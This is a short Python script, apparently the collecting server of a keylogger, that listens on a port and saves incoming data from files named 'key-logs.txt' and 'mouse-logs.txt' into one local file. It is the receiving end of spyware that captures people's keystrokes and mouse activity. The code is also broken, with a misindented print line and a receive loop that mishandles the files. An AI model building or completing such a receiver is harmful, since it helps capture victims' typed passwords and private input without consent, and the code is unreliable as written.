import socket
import sys

files = ['key-logs.txt', 'mouse-logs.txt']

s = socket.socket()
s.bind(("localhost",9999))  # edit hostname and port here
s.listen(10)

    print('listening on port: 9999')    # edit port here
while True:
    sc, address = s.accept()

    print('Got connection from: ',address)
    
    f = open('server-copy.txt','wb') # open in binary    
    for i in range(len(files)):
        l = sc.recv(1024)
        f.write(l)    
    f.close()
    sc.close()

s.close()
